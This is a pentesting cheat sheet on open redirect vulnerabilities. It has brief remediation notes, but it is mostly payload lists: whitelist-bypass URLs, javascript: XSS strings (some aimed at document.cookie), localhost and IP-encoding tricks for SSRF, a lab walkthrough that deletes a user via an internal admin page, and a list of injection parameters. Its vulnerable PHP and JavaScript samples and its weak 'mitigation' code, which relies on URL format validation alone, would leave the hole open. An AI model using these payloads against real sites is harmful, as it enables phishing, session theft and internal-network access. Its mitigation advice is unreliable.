# Open Redirect

* **Open Redirection in the POST method**
  *   **Summary**

      🐞 Open Redirection vulnerability in a POST parameter. Open redirect occurs when a web page is being redirected to another URL in another domain via a user-controlled input.
  *   **Impact**

      🐞 Because the vulnerability can be only exploited via POST requests, its impact is very limited and it cannot be directly used for common Open Redirect attacks such as phishing.
  *   **Remediation**

      🐞 \*\*Remediation\*\*

      * If you definitely need dynamic URLs, use whitelisting. Make a list of valid, accepted URLs and do not accept other URLs.
      * Where possible, do not use users' input for URLs.
      * Ensure that you only accept URLs those are located on the trusted domains.
*   **Bypasses Payloads**

    ```bash
    https://allow_domain.hahwul.com
    https://allow_domain@hahwul.com
    https://www.hahwul.com#allow_domain
    https://www.hahwul.com?allow_domain
    https://www.hahwul.com\\allow_domain
    https://www.hahwul.com&allow_domain
    http:///////////www.hahwul.com
    http:\\\\www.hahwul.com
    http:\\/\\/www.hahwul.com
    # if target accept only google.com
    https://google.com/amp/s/poc.attacker.com
    ```
*   **Open Redirect to XSS**

    ```jsx
    javascript:alert(1)
    java%00script: 
    java%0Ascript: 
    java&tab;script:
    java%0Ascript:al%0Aert()
    java%0d%0ascript%0d%0a:alert(0)
    javascript://%250Aalert(1)
    javascript://%250Aalert(1)//?1
    javascript://%250A1?alert(1):0
    %09Jav%09ascript:alert(document.domain)
    javascript://%250Alert(document.location=document.cookie)
    /%09/javascript:alert(1);
    /%09/javascript:alert(1)
    //%5cjavascript:alert(1);
    //%5cjavascript:alert(1)
    /%5cjavascript:alert(1);
    /%5cjavascript:alert(1)
    javascript://%0aalert(1)
    <>javascript:alert(1);
    //javascript:alert(1);
    //javascript:alert(1)
    /javascript:alert(1);
    /javascript:alert(1)
    \\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)
    javascript:alert(1);
    javascript:alert(1)
    javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
    javascript:confirm(1)
    javascript://https://whitelisted.com/?z=%0Aalert(1)
    javascript:prompt(1)
    jaVAscript://whitelisted.com//%0d%0aalert(1);//
    javascript://whitelisted.com?%a0alert%281%29
    /x:1/:///%01javascript:alert(document.cookie)/
    ";alert(0);//
    %26%2302java%26%23115cript:alert(document.domain)
    javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
    javascript:alert(1)
    javascript:%61lert(1)
    javascript:&#37&#54&#49lert(1)
    javascript:%26%2337%26%2354%26%2349lert(1)
    javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
    ```
* **Open Redirect to SSRF**
  * [Lab: SSRF with filter bypass via open redirection vulnerability | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
    1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    2. Try tampering with the `stockApi` parameter and observe that it isn't possible to make the server issue the request directly to a different host.
    3. Click "next product" and observe that the `path` parameter is placed into the Location header of a redirection response, resulting in an open redirection.
    4. Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the `stockApi` parameter on the stock checker:`/product/nextProduct?path=http://192.168.0.12:8080/admin`
    5. Observe that the stock checker follows the redirection and shows you the admin page.
    6. Amend the path to delete the target user:`/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
  *   **Redirect to localhost or arbitrary domains**

      ```bash
      # Localhost
      <http://127.0.0.1:80>
      <http://127.0.0.1:443>
      <http://127.0.0.1:22>
      <http://127.1:80>
      <http://127.000000000000000.1>
      <http://0>
      http:@0/ --> <http://localhost/>
      <http://0.0.0.0:80>
      <http://localhost:80>
      http://[::]:80/
      http://[::]:25/ SMTP
      http://[::]:3128/ Squid
      http://[0000::1]:80/
      http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
      <http://①②⑦.⓪.⓪.⓪>

      # CDIR bypass
      <http://127.127.127.127>
      <http://127.0.1.3>
      <http://127.0.0.0>

      # Dot bypass
      127。0。0。1
      127%E3%80%820%E3%80%820%E3%80%821

      # Decimal bypass
      <http://2130706433/> = <http://127.0.0.1>
      <http://3232235521/> = <http://192.168.0.1>
      <http://3232235777/> = <http://192.168.1.1>

      # Octal Bypass
      <http://0177.0000.0000.0001>
      <http://00000177.00000000.00000000.00000001>
      <http://017700000001>

      # Hexadecimal bypass
      127.0.0.1 = 0x7f 00 00 01
      <http://0x7f000001/> = <http://127.0.0.1>
      <http://0xc0a80014/> = <http://192.168.0.20>
      0x7f.0x00.0x00.0x01
      0x0000007f.0x00000000.0x00000000.0x00000001

      # Add 0s bypass
      127.000000000000.1

      # You can also mix different encoding formats
      # <https://www.silisoftware.com/tools/ipconverter.php>

      # Malformed and rare
      localhost:+11211aaa
      localhost:00011211aaaa
      <http://0/>
      <http://127.1>
      <http://127.0.1>

      # DNS to localhost
      localtest.me = 127.0.0.1
      customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
      mail.ebc.apple.com = 127.0.0.6 (localhost)
      127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
      www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
      <http://customer1.app.localhost.my.company.127.0.0.1.nip.io>
      <http://bugbounty.dod.network> = 127.0.0.2 (localhost)
      1ynrnhl.xip.io == 169.254.169.254
      spoofed.burpcollaborator.net = 127.0.0.1
      ```
  * [Open-redirection leads to a bounty | by Pratik Dabhi | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/open-redirection-leads-to-a-bounty-d94029e11d17)
* **Code Examples**
  *   .Net

      ```vbnet
      response.redirect("~/mysafe-subdomain/login.aspx")
      ```
  *   Java

      ```java
      response.redirect("<http://mysafedomain.com>");
      ```
  *   PHP

      ```php
      <?php
      /* browser redirections*/
      header("Location: <http://mysafedomain.com>");
      exit;
      ?>
      ```

      ***

      ```bash
      <?php
      $redirect_url = $_GET['redirect_url'];
      header('Location: ' . $redirect_url);
      ?>
      ```
*   **Mitigation code**

    ```php
    <?php
    $redirect_url = $_GET['redirect_url'];
    $redirect_url = filter_var($redirect_url, FILTER_VALIDATE_URL);
    if (!filter_var($redirect_url, FILTER_VALIDATE_URL)) {
        // The URL is not valid, so do not redirect
    } else {
        // The URL is valid, so redirect the user
        header('Location: ' . $redirect_url);
    }
    ?>
    ```
*   **Open Redirect when uploading svg files**

    ```xml
    <code>
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <svg
    onload="window.location='<http://www.google.com>'"
    xmlns="<http://www.w3.org/2000/svg>">
    </svg>
    </code>

    ```
*   **Open Redirect when uploading svg files**

    ```xml
    <code>
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <svg
    onload="window.location='<http://www.google.com>'"
    xmlns="<http://www.w3.org/2000/svg>">
    </svg>
    </code>

    ```
*   [**DOM-based open redirection**](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)

    **Vulnerable code**

    ```jsx
    <a href='#' onclick='returnUrl = /url=(https?:\\/\\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
    ```

    **Exploit**

    ```jsx
    https://<target.com>/post?postId=4&url=https://exploit-0ad70038030eccda80ecd9d801610038.exploit-server.net/
    ```
*   **Common injection parameters**

    ```
    /{payload}
    ?next={payload}
    ?url={payload}
    ?target={payload}
    ?rurl={payload}
    ?dest={payload}
    ?destination={payload}
    ?redir={payload}
    ?redirect_uri={payload}
    ?redirect_url={payload}
    ?redirect={payload}
    /redirect/{payload}
    /cgi-bin/redirect.cgi?{payload}
    /out/{payload}
    /out?{payload}
    ?view={payload}
    /login?to={payload}
    ?image_url={payload}
    ?go={payload}
    ?return={payload}
    ?returnTo={payload}
    ?return_to={payload}
    ?checkout_url={payload}
    ?continue={payload}
    ?return_path={payload}
    success=https://c1h2e1.github.io
    data=https://c1h2e1.github.io
    qurl=https://c1h2e1.github.io
    login=https://c1h2e1.github.io
    logout=https://c1h2e1.github.io
    ext=https://c1h2e1.github.io
    clickurl=https://c1h2e1.github.io
    goto=https://c1h2e1.github.io
    rit_url=https://c1h2e1.github.io
    forward_url=https://c1h2e1.github.io
    @<https://c1h2e1.github.io>
    forward=https://c1h2e1.github.io
    pic=https://c1h2e1.github.io
    callback_url=https://c1h2e1.github.io
    jump=https://c1h2e1.github.io
    jump_url=https://c1h2e1.github.io
    click?u=https://c1h2e1.github.io
    originUrl=https://c1h2e1.github.io
    origin=https://c1h2e1.github.io
    Url=https://c1h2e1.github.io
    desturl=https://c1h2e1.github.io
    u=https://c1h2e1.github.io
    page=https://c1h2e1.github.io
    u1=https://c1h2e1.github.io
    action=https://c1h2e1.github.io
    action_url=https://c1h2e1.github.io
    Redirect=https://c1h2e1.github.io
    sp_url=https://c1h2e1.github.io
    service=https://c1h2e1.github.io
    recurl=https://c1h2e1.github.io
    j?url=https://c1h2e1.github.io
    url=//<https://c1h2e1.github.io>
    uri=https://c1h2e1.github.io
    u=https://c1h2e1.github.io
    allinurl:<https://c1h2e1.github.io>
    q=https://c1h2e1.github.io
    link=https://c1h2e1.github.io
    src=https://c1h2e1.github.io
    tc?src=https://c1h2e1.github.io
    linkAddress=https://c1h2e1.github.io
    location=https://c1h2e1.github.io
    burl=https://c1h2e1.github.io
    request=https://c1h2e1.github.io
    backurl=https://c1h2e1.github.io
    RedirectUrl=https://c1h2e1.github.io
    Redirect=https://c1h2e1.github.io
    ReturnUrl=https://c1h2e1.github.io

    ```
* **Tools**
  * [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)
